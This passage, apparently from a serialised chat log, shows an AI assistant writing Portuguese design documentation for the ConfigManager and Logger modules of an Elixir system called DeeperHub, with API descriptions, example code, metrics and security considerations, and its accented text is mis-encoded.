    *   Implementar um cache para configura√ß√µes frequentemente acessadas para melhorar o desempenho.
    *   Invalidar o cache automaticamente quando as configura√ß√µes s√£o alteradas.
*   **Carregamento de Configura√ß√µes:**
    *   Carregar configura√ß√µes de diferentes fontes na inicializa√ß√£o (ex: `config/*.exs`, vari√°veis de ambiente, banco de dados).
*   **Auditoria (Opcional):**
    *   Integrar com `DeeperHub.Audit` para registrar quem alterou qual configura√ß√£o e quando.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Core.ConfigManager` (Fachada P√∫blica):**
    *   **Responsabilidade:** Ponto de entrada para todas as intera√ß√µes com o sistema de configura√ß√£o.
    *   **Intera√ß√µes:** Delega chamadas para o `ConfigManager.Server`.
2.  **`DeeperHub.Core.ConfigManager.Server` (GenServer):**
    *   **Responsabilidade:** Processo central que gerencia o estado das configura√ß√µes, interage com o storage e o cache.
    *   **Estado Interno:**
        *   Cache de Configura√ß√µes (provavelmente uma tabela ETS gerenciada pelo `ConfigManager.Cache`).
        *   Informa√ß√µes sobre as fontes de configura√ß√£o.
    *   **Intera√ß√µes:** Recebe chamadas da fachada, interage com `StorageAdapter` para persist√™ncia e `Cache` para caching, e com `Core.EventBus` para notificar mudan√ßas.
3.  **`DeeperHub.Core.ConfigManager.StorageAdapter` (Behaviour e Implementa√ß√µes):**
    *   **Responsabilidade:** Abstrair a camada de persist√™ncia das configura√ß√µes.
    *   **Implementa√ß√µes:**
        *   `EctoStorage`: Para armazenar configura√ß√µes no banco de dados principal.
        *   `FileStorage`: Para carregar configura√ß√µes de arquivos (ex: arquivos `.yaml` ou `.json` adicionais).
        *   `EnvVarStorage`: Para carregar configura√ß√µes de vari√°veis de ambiente.
        *   `CombinedStorage`: Para agregar configura√ß√µes de m√∫ltiplas fontes com uma ordem de preced√™ncia definida.
4.  **`DeeperHub.Core.ConfigManager.Cache` (GenServer ou ETS direta):**
    *   **Responsabilidade:** Armazenar em cache as configura√ß√µes para acesso r√°pido.
    *   **Intera√ß√µes:** Usado pelo `ConfigManager.Server` para reduzir acessos ao `StorageAdapter`.
5.  **`DeeperHub.Core.ConfigManager.Schema.Setting` (Ecto Schema):**
    *   **Responsabilidade:** Define a estrutura da tabela de configura√ß√µes no banco de dados (se `EctoStorage` for usado). Inclui campos como `key`, `value`, `scope`, `data_type`, `is_sensitive`, `description`.
6.  **`DeeperHub.Core.ConfigManager.ChangeNotifier` (Opcional, pode ser parte do Server):**
    *   **Responsabilidade:** Publicar eventos no `Core.EventBus` quando configura√ß√µes mudam.

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/core/config_manager/
‚îú‚îÄ‚îÄ config_manager.ex             # Fachada P√∫blica
‚îú‚îÄ‚îÄ server.ex                     # GenServer principal
‚îú‚îÄ‚îÄ cache.ex                      # L√≥gica de cache
‚îú‚îÄ‚îÄ change_notifier.ex            # L√≥gica de notifica√ß√£o de eventos
‚îÇ
‚îú‚îÄ‚îÄ schema/
‚îÇ   ‚îî‚îÄ‚îÄ setting.ex                # Ecto Schema para configura√ß√µes
‚îÇ
‚îú‚îÄ‚îÄ storage/
‚îÇ   ‚îú‚îÄ‚îÄ storage_adapter.ex        # Behaviour
‚îÇ   ‚îú‚îÄ‚îÄ ecto_storage.ex           # Implementa√ß√£o com BD
‚îÇ   ‚îú‚îÄ‚îÄ file_storage.ex           # Implementa√ß√£o com arquivos
‚îÇ   ‚îú‚îÄ‚îÄ env_var_storage.ex        # Implementa√ß√£o com vari√°veis de ambiente
‚îÇ   ‚îî‚îÄ‚îÄ combined_storage.ex       # Implementa√ß√£o para m√∫ltiplas fontes
‚îÇ
‚îî‚îÄ‚îÄ supervisor.ex                 # Supervisor para os processos do ConfigManager
```

### 3.3. Decis√µes de Design Importantes

*   **Centraliza√ß√£o:** Um √∫nico ponto de verdade para todas as configura√ß√µes da aplica√ß√£o.
*   **Abstra√ß√£o de Fonte:** A forma como as configura√ß√µes s√£o armazenadas ou de onde v√™m √© transparente para os consumidores.
*   **Reatividade:** O sistema pode reagir dinamicamente a mudan√ßas de configura√ß√£o sem rein√≠cio.
*   **Performance:** O uso de cache √© crucial para evitar gargalos no acesso a configura√ß√µes.
*   **Seguran√ßa:** Configura√ß√µes sens√≠veis s√£o tratadas de forma apropriada.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **M√≥dulo Obt√©m Limite de Taxa:**
    *   O m√≥dulo `DeeperHub.API.RateLimiter` precisa saber o limite de requisi√ß√µes para um endpoint.
    *   Ele chama `DeeperHub.Core.ConfigManager.get(\"api.rate_limit.users_endpoint\", \"global\", 100)`.
*   **Administrador Altera Configura√ß√£o de Email:**
    *   Um administrador, atrav√©s de uma interface (Console ou Web), altera a configura√ß√£o do servidor SMTP.
    *   A interface chama `DeeperHub.Core.ConfigManager.set(\"notifications.smtp.host\", \"new.smtp.server\", scope: \"global\", description: \"...\")`.
    *   O `ConfigManager` atualiza o valor no storage, invalida o cache e publica um evento `config_updated`.
    *   O m√≥dulo `DeeperHub.Notifications` (ou seu `Mailer`) recebe o evento e recarrega a configura√ß√£o do SMTP.
*   **Definir Feature Flag:**
    *   O m√≥dulo `DeeperHub.FeatureFlags` usa o `ConfigManager` para armazenar e recuperar o estado das feature flags.
    *   Ex: `DeeperHub.Core.ConfigManager.get([:feature_flags, :new_dashboard, :enabled], \"global\", false)`.
*   **Carregamento Inicial:**
    *   Na inicializa√ß√£o da aplica√ß√£o, o `ConfigManager` carrega as configura√ß√µes de `config/runtime.exs`, vari√°veis de ambiente e do banco de dados.

## üåä 5. Fluxos Importantes

### 5.1. Fluxo de Obten√ß√£o de Configura√ß√£o (`get/3`)

1.  **Chamador:** Um m√≥dulo chama `DeeperHub.Core.ConfigManager.get(key, scope, default_value)`.
2.  **`ConfigManager.Server`:**
    *   Recebe a chamada.
    *   Primeiro, tenta obter o valor do `ConfigManager.Cache` usando a `key` e `scope`.
    *   **Cache Hit:** Se encontrado e n√£o expirado, retorna o valor do cache.
    *   **Cache Miss:**
        *   Chama o `StorageAdapter` apropriado para obter o valor da fonte prim√°ria (ex: `EctoStorage.get_setting(key, scope)`).
        *   Se encontrado no storage:
            *   Armazena o valor no `ConfigManager.Cache` com um TTL.
            *   Retorna o valor.
        *   Se n√£o encontrado no storage:
            *   Retorna o `default_value` fornecido.
3.  **Sensibilidade:** Se a configura√ß√£o for marcada como `:is_sensitive` e o contexto de chamada n√£o for privilegiado, o valor pode ser mascarado ou omitido (l√≥gica a ser definida).

### 5.2. Fluxo de Atualiza√ß√£o de Configura√ß√£o (`set/3`)

1.  **Chamador:** Um m√≥dulo (geralmente uma interface administrativa ou processo de deploy) chama `DeeperHub.Core.ConfigManager.set(key, value, opts)`.
2.  **`ConfigManager.Server`:**
    *   Recebe a chamada.
    *   Valida os dados de entrada (tipo do valor, escopo, etc.).
    *   Chama o `StorageAdapter` para persistir a nova configura√ß√£o (ex: `EctoStorage.update_setting(key, scope, value, opts)`).
    *   Se a persist√™ncia for bem-sucedida:
        *   Invalida/Atualiza a entrada correspondente no `ConfigManager.Cache`.
        *   Utiliza o `ChangeNotifier` para publicar um evento no `Core.EventBus` (ex: `event_bus.publish(\"configmanager.updated\", %{key: key, scope: scope, new_value: value})`).
    *   Retorna `{:ok, setting}` ou `{:error, reason}`.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada)

### 6.1. `DeeperHub.Core.ConfigManager.get(key :: String.t() | list(atom()), scope :: String.t() | nil, default :: term() | nil) :: term()`

*   **Descri√ß√£o:** Obt√©m o valor de uma configura√ß√£o. Se a chave for uma lista de √°tomos (ex: `[:service, :feature, :enabled]`), ela √© convertida internamente para uma string (ex: `\"service.feature.enabled\"`).
*   **`@spec`:** `get(key :: String.t() | list(atom()), scope :: String.t() | nil, default :: term() | nil) :: term()`
*   **Par√¢metros:**
    *   `key`: A chave da configura√ß√£o. Pode ser uma string `a.b.c` ou uma lista `[:a, :b, :c]`.
    *   `scope`: O escopo da configura√ß√£o (ex: `\"global\"`, `\"user_id:123\"`). Se `nil`, geralmente assume `\"global\"`.
    *   `default`: O valor a ser retornado se a configura√ß√£o n√£o for encontrada.
*   **Retorno:** O valor da configura√ß√£o ou o valor `default`.
*   **Exemplo de Uso (Elixir):**
    ```elixir
    timeout = DeeperHub.Core.ConfigManager.get(\"app.request_timeout_ms\", \"global\", 5000)
    feature_enabled = DeeperHub.Core.ConfigManager.get([:features, :new_reporting, :enabled], \"tenant:abc\", false)
    ```

### 6.2. `DeeperHub.Core.ConfigManager.get_config(keys :: list(atom() | String.t()), default :: term() | nil) :: term()`

*   **Descri√ß√£o:** Similar a `get/3` mas assume escopo global e aceita uma lista de chaves para construir o nome da configura√ß√£o.
*   **`@spec`:** `get_config(keys :: list(atom() | String.t()), default :: term() | nil) :: term()`
*   **Par√¢metros:**
    *   `keys`: Lista de √°tomos ou strings para formar a chave da configura√ß√£o (ex: `[:myapp, :feature_x, :timeout]`).
    *   `default`: O valor padr√£o.
*   **Retorno:** O valor da configura√ß√£o ou o valor `default`.
*   **Exemplo de Uso (Elixir):**
    ```elixir
    api_key = DeeperHub.Core.ConfigManager.get_config([:external_services, :weather_api, :key], nil)
    ```

### 6.3. `DeeperHub.Core.ConfigManager.set(key :: String.t() | list(atom()), value :: term(), opts :: keyword()) :: {:ok, Setting.t()} | {:error, Ecto.Changeset.t() | term()}`

*   **Descri√ß√£o:** Define ou atualiza o valor de uma configura√ß√£o.
*   **`@spec`:** `set(key :: String.t() | list(atom()), value :: term(), opts :: keyword()) :: {:ok, map()} | {:error, term()}`
*   **Par√¢metros:**
    *   `key`: A chave da configura√ß√£o.
    *   `value`: O novo valor para a configura√ß√£o.
    *   `opts`: Lista de op√ß√µes:
        *   `:scope` (String): O escopo da configura√ß√£o. (Padr√£o: `\"global\"`)
        *   `:data_type` (Atom): O tipo de dado do valor (ex: `:string`, `:integer`, `:boolean`, `:map`, `:list`). Se omitido, tenta inferir.
        *   `:description` (String): Uma descri√ß√£o da configura√ß√£o.
        *   `:is_sensitive` (Boolean): Indica se a configura√ß√£o cont√©m dados sens√≠veis. (Padr√£o: `false`)
        *   `:created_by` (String): Identificador de quem est√° fazendo a altera√ß√£o (para auditoria).
*   **Retorno:**
    *   `{:ok, setting}`: Em caso de sucesso, retorna a struct da configura√ß√£o salva (ex: `DeeperHub.Core.ConfigManager.Schema.Setting.t()`).
    *   `{:error, changeset}`: Se houver falha na valida√ß√£o.
    *   `{:error, reason}`: Para outros erros.
*   **Exemplo de Uso (Elixir):**
    ```elixir
    opts = [
      scope: \"global\",
      data_type: :integer,
      description: \"Timeout para requisi√ß√µes √† API externa X.\",
      is_sensitive: false,
      created_by: \"admin_user_id\"
    ]
    case DeeperHub.Core.ConfigManager.set(\"external_api.timeout\", 10000, opts) do
      {:ok, setting} -> Logger.info(\"Configura√ß√£o '#{setting.key}' atualizada.\")
      {:error, reason} -> Logger.error(\"Falha ao atualizar configura√ß√£o: #{inspect(reason)}\")
    end
    ```

### 6.4. `DeeperHub.Core.ConfigManager.delete(key :: String.t() | list(atom()), scope :: String.t() | nil, opts :: keyword()) :: {:ok, Setting.t()} | {:error, :not_found | term()}`

*   **Descri√ß√£o:** Remove uma configura√ß√£o.
*   **`@spec`:** `delete(key :: String.t() | list(atom()), scope :: String.t() | nil, opts :: keyword()) :: {:ok, map()} | {:error, term()}`
*   **Par√¢metros:**
    *   `key`: A chave da configura√ß√£o.
    *   `scope`: O escopo da configura√ß√£o. (Padr√£o: `\"global\"`)
    *   `opts`: Lista de op√ß√µes:
        *   `:deleted_by` (String): Identificador de quem est√° fazendo a remo√ß√£o (para auditoria).
*   **Retorno:**
    *   `{:ok, setting}`: A configura√ß√£o que foi removida.
    *   `{:error, :not_found}`: Se a configura√ß√£o n√£o existir.
    *   `{:error, reason}`: Para outros erros.
*   **Exemplo de Uso (Elixir):**
    ```elixir
    case DeeperHub.Core.ConfigManager.delete(\"old_feature.enabled\", \"global\", deleted_by: \"cleanup_script\") do
      {:ok, _} -> Logger.info(\"Configura√ß√£o removida.\")
      {:error, :not_found} -> Logger.warn(\"Configura√ß√£o n√£o encontrada para remo√ß√£o.\")
      {:error, reason} -> Logger.error(\"Falha ao remover configura√ß√£o: #{inspect(reason)}\")
    end
    ```

### 6.5. `DeeperHub.Core.ConfigManager.subscribe(event_key_pattern :: String.t(), subscriber :: pid() | module()) :: :ok | {:error, term()}`

*   **Descri√ß√£o:** Permite que um processo ou m√≥dulo se inscreva para notifica√ß√µes de mudan√ßas em configura√ß√µes que correspondam ao `event_key_pattern`.
*   **`@spec`:** `subscribe(event_key_pattern :: String.t(), subscriber :: pid() | module()) :: :ok | {:error, term()}`
*   **Par√¢metros:**
    *   `event_key_pattern`: Um padr√£o para as chaves de configura√ß√£o (ex: `\"notifications.*\"`, `\"features.new_dashboard.enabled\"`).
    *   `subscriber`: O PID ou nome do m√≥dulo que receber√° as mensagens `{:config_changed, key, scope, old_value, new_value}`.
*   **Retorno:** `:ok` ou `{:error, reason}`.
*   **Exemplo de Uso (Elixir):**
    ```elixir
    # Em um GenServer
    def init(_args) do
      DeeperHub.Core.ConfigManager.subscribe(\"notifications.smtp.*\", self())
      {:ok, load_smtp_config()}
    end

    def handle_info({:config_changed, key, _scope, _old_value, new_value}, state) do
      Logger.info(\"Configura√ß√£o '#{key}' alterada para: #{inspect(new_value)}. Recarregando...\")
      new_smtp_config = load_smtp_config() # Fun√ß√£o para recarregar
      {:noreply, %{state | smtp_config: new_smtp_config}}
    end
    ```

## ‚öôÔ∏è 7. Configura√ß√£o

O pr√≥prio `ConfigManager` carrega suas configura√ß√µes iniciais de:
1.  Arquivos de configura√ß√£o Elixir (ex: `config/runtime.exs`).
2.  Vari√°veis de ambiente (com um prefixo definido, ex: `DEEPERHUB_CORE_CONFIGMANAGER_`).
3.  Banco de dados (se o `EctoStorage` estiver configurado como uma fonte).

Configura√ß√µes espec√≠ficas do `ConfigManager`:
*   `[:core, :config_manager, :cache_ttl_seconds]` (Integer): TTL padr√£o para entradas de configura√ß√£o no cache. (Padr√£o: `300` - 5 minutos)
*   `[:core, :config_manager, :sources]` (List): Lista de m√≥dulos adaptadores de storage a serem usados e sua ordem de preced√™ncia (ex: `[DeeperHub.Core.ConfigManager.Storage.EnvVarStorage, DeeperHub.Core.ConfigManager.Storage.EctoStorage, DeeperHub.Core.ConfigManager.Storage.FileStorage]`).
*   `[:core, :config_manager, :file_storage, :paths]` (List de Strings): Caminhos para arquivos de configura√ß√£o adicionais se `FileStorage` for usado.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.EventBus`: Para notificar sobre mudan√ßas de configura√ß√£o.
*   `DeeperHub.Core.Logger`: Para logging.
*   `DeeperHub.Core.Metrics`: Para m√©tricas de acesso ao cache e storage.
*   `DeeperHub.Core.Repo` (opcional): Se `EctoStorage` for usado.
*   `DeeperHub.Core.Supervisor` (indireta): Para ser supervisionado.

### 8.2. Bibliotecas Externas

*   `Ecto` (opcional): Se `EctoStorage` for usado.
*   `Jason` (opcional): Se `FileStorage` for usado com arquivos JSON.

## ü§ù 9. Como Usar / Integra√ß√£o

A maioria dos m√≥dulos no sistema DeeperHub depender√° do `ConfigManager` para obter suas configura√ß√µes.

**Obtendo uma configura√ß√£o:**
```elixir
alias DeeperHub.Core.ConfigManager

# Obter com valor padr√£o
default_page_size = ConfigManager.get(\"myapp.pagination.default_size\", \"global\", 20)

# Obter usando lista de chaves (escopo global impl√≠cito)
api_url = ConfigManager.get_config([:services, :external_foo, :api_url])

if api_url do
  # ... usar api_url
else
  Logger.warn(\"URL da API externa Foo n√£o configurada.\")
end
```

**Reagindo a mudan√ßas (em um GenServer):**
```elixir
defmodule MyService do
  use GenServer
  alias DeeperHub.Core.ConfigManager
  alias DeeperHub.Core.Logger

  def start_link(opts) do
    GenServer.start_link(__MODULE__, opts, name: __MODULE__)
  end

  @impl true
  def init(_opts) do
    ConfigManager.subscribe(\"myservice.feature_x.enabled\", self())
    state = %{feature_x_enabled: ConfigManager.get(\"myservice.feature_x.enabled\", \"global\", false)}
    Logger.info(\"MyService iniciado, feature_x_enabled: #{state.feature_x_enabled}\")
    {:ok, state}
  end

  @impl true
  def handle_info({:config_changed, \"myservice.feature_x.enabled\", _scope, _old_value, new_value}, state) do
    Logger.info(\"Configura√ß√£o de feature_x alterada para: #{new_value}. Atualizando estado.\")
    {:noreply, %{state | feature_x_enabled: new_value}}
  end

  def handle_info(_msg, state), do: {:noreply, state}

  # ... outras fun√ß√µes ...
end
```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testes unit√°rios para o `ConfigManager.Server`, `Cache`, e cada `StorageAdapter`.
*   Testes de integra√ß√£o para verificar o fluxo completo de obten√ß√£o e defini√ß√£o de configura√ß√µes, incluindo invalida√ß√£o de cache e publica√ß√£o de eventos.
*   Localiza√ß√£o dos testes: `test/deeper_hub/core/config_manager/`

### 10.2. M√©tricas

*   **Contadores:**
    *   `deeper_hub.core.config_manager.get.cache_hit.count` (tags: `key_prefix`)
    *   `deeper_hub.core.config_manager.get.cache_miss.count` (tags: `key_prefix`)
    *   `deeper_hub.core.config_manager.set.success.count` (tags: `key_prefix`)
    *   `deeper_hub.core.config_manager.set.failure.count` (tags: `key_prefix`)
    *   `deeper_hub.core.config_manager.delete.success.count` (tags: `key_prefix`)
*   **Histogramas/Timers:**
    *   `deeper_hub.core.config_manager.get.duration_ms` (tags: `source` (`:cache`, `:storage`))
    *   `deeper_hub.core.config_manager.set.duration_ms`
*   **Gauges:**
    *   `deeper_hub.core.config_manager.cache.size.gauge`

### 10.3. Logs

*   **N√≠vel INFO:**
    *   Carregamento de configura√ß√µes na inicializa√ß√£o (fontes, n√∫mero de chaves).
    *   Atualiza√ß√µes de configura√ß√£o bem-sucedidas (chave, escopo, quem alterou).
    *   Eventos de invalida√ß√£o de cache.
*   **N√≠vel WARNING:**
    *   Tentativa de obter uma configura√ß√£o n√£o existente que n√£o possui valor padr√£o.
    *   Falha ao carregar configura√ß√µes de uma fonte espec√≠fica (ex: arquivo n√£o encontrado).
*   **N√≠vel ERROR:**
    *   Falha ao persistir uma configura√ß√£o.
    *   Erro interno no `ConfigManager.Server`.

### 10.4. Telemetria

Eventos Telemetry s√£o emitidos para:
*   `[:deeper_hub, :core, :config_manager, :get, :start | :stop | :exception]`
    *   Metadados: `%{key: key, scope: scope, source: :cache | :storage}`
*   `[:deeper_hub, :core, :config_manager, :set, :start | :stop | :exception]`
    *   Metadados: `%{key: key, scope: scope, created_by: user_id}`
*   `[:deeper_hub, :core, :config_manager, :cache, :invalidated]`
    *   Metadados: `%{key: key, scope: scope | :all}`

## ‚ùå 11. Tratamento de Erros

*   `get/3`: Retorna valor padr√£o se a chave n√£o for encontrada.
*   `set/3`, `delete/3`: Retornam `{:error, changeset}` para erros de valida√ß√£o ou `{:error, reason}` para outros problemas de persist√™ncia ou internos.
*   Falhas ao carregar configura√ß√µes de uma fonte na inicializa√ß√£o s√£o logadas, mas o sistema pode continuar com as configura√ß√µes de outras fontes ou padr√µes.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **Configura√ß√µes Sens√≠veis:** O campo `:is_sensitive` no schema `Setting` deve ser usado para marcar chaves que cont√™m informa√ß√µes como senhas, API keys, etc.
*   **Acesso a Configura√ß√µes Sens√≠veis:** A API `get/3` n√£o deve retornar o valor real de configura√ß√µes sens√≠veis, a menos que o chamador tenha privil√©gios espec√≠ficos (a ser implementado, possivelmente com um contexto de chamada). Elas podem retornar um valor mascarado (ex: `\"[SENSITIVE]\"`) ou exigir uma fun√ß√£o de acesso especial.
*   **Modifica√ß√£o de Configura√ß√µes:** A API `set/3` e `delete/3` deve ser protegida. Idealmente, apenas processos administrativos ou de deploy devem ter permiss√£o para modificar configura√ß√µes globais. A op√ß√£o `:created_by` ajuda na auditoria.
*   **Valida√ß√£o de Tipos:** Garantir que os valores das configura√ß√µes correspondam ao `data_type` esperado ajuda a prevenir erros e comportamentos inesperados.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Novas configura√ß√µes devem ter chaves bem definidas e descri√ß√µes claras.
*   Considere o escopo apropriado para cada nova configura√ß√£o.
*   Marque configura√ß√µes sens√≠veis corretamente.
*   Adicione valida√ß√µes no `Setting.changeset/2` para novos tipos de dados ou restri√ß√µes.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar uma UI administrativa para gerenciamento de configura√ß√µes.
*   [ ] Adicionar suporte a \"hot reloading\" de arquivos de configura√ß√£o sem rein√≠cio do `ConfigManager`.
*   [ ] Integrar com um servi√ßo de configura√ß√£o externo (ex: HashiCorp Consul, etcd).
*   [ ] Melhorar a resolu√ß√£o de preced√™ncia entre diferentes `StorageAdapter`s (ex: vari√°veis de ambiente sempre sobrescrevem banco de dados, que sobrescreve arquivo).
*   [ ] Implementar controle de acesso mais granular para a modifica√ß√£o de configura√ß√µes espec√≠ficas.
*   [ ] Adicionar funcionalidade de \"hist√≥rico de vers√µes\" para configura√ß√µes, permitindo rollback.

---

*√öltima atualiza√ß√£o: 2025-05-11*

---

Pr√≥ximo! Qual m√≥dulo voc√™ gostaria de detalhar agora? Talvez `DeeperHub.Core.Logger` ou `DeeperHub.Auth`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Entendido! Vamos continuar com o `DeeperHub.Core.Logger`, que √© fundamental para a observabilidade do sistema.

---

# M√≥dulo: `DeeperHub.Core.Logger` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Core.Logger`

O m√≥dulo `DeeperHub.Core.Logger` serve como a fachada centralizada e padronizada para todas as opera√ß√µes de logging dentro do sistema DeeperHub. Ele abstrai a implementa√ß√£o de logging subjacente (que pode ser o `Logger` padr√£o do Elixir, um backend customizado, ou integra√ß√£o com servi√ßos externos como Logstash, Datadog, etc.), fornecendo uma API consistente para todos os m√≥dulos da aplica√ß√£o.

Seu principal objetivo √© garantir que os logs sejam estruturados, ricos em contexto, e facilmente pesquis√°veis, facilitando a depura√ß√£o, monitoramento e an√°lise do comportamento do sistema. üòä

*(Nota: A documenta√ß√£o original mencionava `DeeperHub.Logger` e `DeeperHub.Core.LoggerFacade`, e tamb√©m `DeeperHub.Core.Services.LoggerFacade`. Esta documenta√ß√£o consolida a ideia de uma √∫nica fachada principal `DeeperHub.Core.Logger` que delega para uma implementa√ß√£o mais robusta, como o `DeeperHub.Shared.Logging.StructuredLogger` mencionado.)*

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Interface de Logging Unificada:**
    *   Fornecer fun√ß√µes para diferentes n√≠veis de severidade: `debug/3`, `info/3`, `warn/3`, `error/3`, `critical/3` (e potencialmente `emergency/3`, `notice/3` como visto na documenta√ß√£o original).
    *   Aceitar uma mensagem e um mapa de metadados para logs estruturados.
*   **Enriquecimento Autom√°tico de Logs:**
    *   Adicionar automaticamente informa√ß√µes contextuais a cada log, como:
        *   Timestamp.
        *   N√≠vel de severidade.
        *   M√≥dulo de origem.
        *   Nome da fun√ß√£o e aridade (opcional, via macro).
        *   PID do processo.
        *   ID de Correla√ß√£o/Trace ID (se integrado com `DistributedTracing`).
*   **Suporte a Contexto de Logging:**
    *   Permitir que os m√≥dulos definam metadados de contexto que s√£o automaticamente inclu√≠dos em todos os logs subsequentes dentro daquele processo ou escopo (via `DeeperHub.Shared.Logging.Context`).
*   **Formata√ß√£o Estruturada:**
    *   Garantir que os logs sejam formatados de maneira consistente (ex: JSON) para facilitar a an√°lise por ferramentas de logging.
*   **Configurabilidade de Backends:**
    *   Permitir a configura√ß√£o de m√∫ltiplos backends de logging (console, arquivo, servi√ßo externo) atrav√©s do `DeeperHub.Core.ConfigManager`.
    *   Suportar diferentes n√≠veis de log por backend.
*   **Sanitiza√ß√£o de Dados Sens√≠veis (Integra√ß√£o):**
    *   Integrar com um servi√ßo de sanitiza√ß√£o (como `DeeperHub.Security.LogSanitizer`) para remover ou mascarar dados sens√≠veis dos logs antes da escrita.
*   **Integra√ß√£o com M√©tricas:**
    *   Opcionalmente, registrar m√©tricas sobre o volume e tipos de logs gerados.
*   **Emojis Configur√°veis (Nice-to-have):**
    *   Permitir a configura√ß√£o de emojis para diferentes n√≠veis de log para melhorar a legibilidade no console (via `DeeperHub.Logger.Config`).

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Core.Logger` (Fachada P√∫blica):**
    *   **Responsabilidade:** √â a API p√∫blica que todos os m√≥dulos usam para registrar logs.
    *   **Intera√ß√µes:**
        *   Coleta informa√ß√µes de contexto (m√≥dulo, fun√ß√£o) automaticamente (potencialmente usando macros).
        *   Obt√©m o contexto de logging do processo (via `DeeperHub.Shared.Logging.Context`).
        *   Obt√©m o ID de correla√ß√£o (via `DeeperHub.Shared.Logging.DistributedTracing`).
        *   Chama o `DeeperHub.Core.Logger.Adapter` para processar e enviar o log.
2.  **`DeeperHub.Core.Logger.Adapter` (Behaviour e Implementa√ß√£o Padr√£o):**
    *   **Responsabilidade:** Abstrair a l√≥gica de processamento e envio de logs para os backends.
    *   **Comportamento (`LoggerBehaviour`):** Define a interface que os adaptadores devem implementar.
    *   **Implementa√ß√£o Padr√£o (`DefaultLoggerAdapter` ou `StructuredLoggerAdapter`):**
        *   Pode ser um GenServer para enfileirar logs e process√°-los assincronamente (para evitar bloqueio).
        *   Formata a mensagem e os metadados em uma estrutura padronizada (ex: JSON).
        *   Integra com o `LogSanitizer` para remover dados sens√≠veis.
        *   Itera sobre os backends configurados e envia o log formatado para cada um que corresponda ao n√≠vel de severidade.
3.  **`DeeperHub.Shared.Logging.StructuredLogger` (GenServer, ex-`DeeperHub.Logger.StructuredLogger`):**
    *   **Responsabilidade:** Pode ser a implementa√ß√£o central do `DefaultLoggerAdapter`. Gerencia m√∫ltiplos backends de logging e despacha mensagens de log formatadas com contexto e metadados.
    *   **Estado Interno:** Lista de backends configurados, filtros por backend.
4.  **Backends de Logging (Exemplos):**
    *   `Logger.Backends.Console`: Backend padr√£o do Elixir para o console.
    *   `Logger.Backends.File`: Para escrever logs em arquivos.
    *   Adaptadores customizados para servi√ßos como Datadog, Logstash, Sentry, etc.
5.  **`DeeperHub.Shared.Logging.Context`:**
    *   **Responsabilidade:** Gerenciar metadados de contexto por processo.
6.  **`DeeperHub.Logger.Config` (Opcional, para Emojis):**
    *   **Responsabilidade:** Gerenciar a configura√ß√£o de emojis para n√≠veis de log.

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/core/logger/
‚îú‚îÄ‚îÄ logger.ex                     # Fachada P√∫blica
‚îú‚îÄ‚îÄ adapter.ex                    # Behaviour e Default Adapter (ou StructuredLoggerAdapter)
‚îÇ
‚îú‚îÄ‚îÄ backends/                     # (Opcional) Adaptadores customizados para backends
‚îÇ   ‚îî‚îÄ‚îÄ datadog_backend.ex
‚îÇ
‚îî‚îÄ‚îÄ supervisor.ex                 # Supervisor para os processos do Logger (ex: StructuredLogger GenServer)

lib/deeper_hub/shared/logging/    # M√≥dulos compartilhados de logging
‚îú‚îÄ‚îÄ structured_logger.ex          # Implementa√ß√£o central do GenServer de logging
‚îú‚îÄ‚îÄ context.ex
‚îî‚îÄ‚îÄ distributed_tracing.ex        # Se o trace_id for gerenciado aqui

lib/deeper_hub/logger/            # (Opcional) Se manter separa√ß√£o para Config de Emojis
‚îú‚îÄ‚îÄ config.ex                     # Configura√ß√£o de Emojis
‚îî‚îÄ‚îÄ interface.ex                  # Interface simplificada (se necess√°ria)
```

### 3.3. Decis√µes de Design Importantes

*   **Log Estruturado como Padr√£o:** Todos os logs devem ser estruturados (ex: JSON) para facilitar a consulta e an√°lise por ferramentas automatizadas.
*   **Contexto √© Rei:** Enriquecer logs com o m√°ximo de contexto relevante (autom√°tico e manual) √© crucial para depura√ß√£o.
*   **Desempenho:** O logging n√£o deve impactar significativamente o desempenho das opera√ß√µes principais. O processamento e envio para backends remotos deve ser ass√≠ncrono.
*   **Sanitiza√ß√£o Obrigat√≥ria:** Dados sens√≠veis *nunca* devem vazar para os logs. A integra√ß√£o com um `LogSanitizer` √© fundamental.
*   **Configurabilidade:** N√≠veis de log e backends devem ser facilmente configur√°veis por ambiente e, idealmente, em tempo de execu√ß√£o para alguns casos.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Desenvolvedor Depura um Fluxo:** Um desenvolvedor usa `Logger.debug(\"Estado da vari√°vel X\", %{variable_x: data})` para inspecionar o estado durante a execu√ß√£o.
*   **Opera√ß√£o Conclu√≠da com Sucesso:** Um servi√ßo registra `Logger.info(\"Pedido processado com sucesso\", %{order_id: 123, user_id: 456})`.
*   **Condi√ß√£o Inesperada mas N√£o Cr√≠tica:** O sistema detecta uma configura√ß√£o opcional ausente e registra `Logger.warn(\"Configura√ß√£o de cache n√£o encontrada, usando padr√£o.\", %{cache_type: :local})`.
*   **Erro Tratado:** Uma API externa retorna um erro esperado, e o sistema registra `Logger.error(\"Falha ao buscar dados da API externa\", %{api: \"WeatherService\", error: \"timeout\", retry_attempt: 2})`.
*   **Falha Cr√≠tica:** O banco de dados fica indispon√≠vel. `Logger.critical(\"Conex√£o com banco de dados perdida!\", %{db_host: \"...\", error_details: e})`.

## üåä 5. Fluxos Importantes

### Fluxo de Registro de Log

1.  **M√≥dulo Chamador:** Chama uma fun√ß√£o da fachada `DeeperHub.Core.Logger` (ex: `Logger.info(message, metadata)`).
    *   Macros podem capturar `__MODULE__`, `__ENV__.function`.
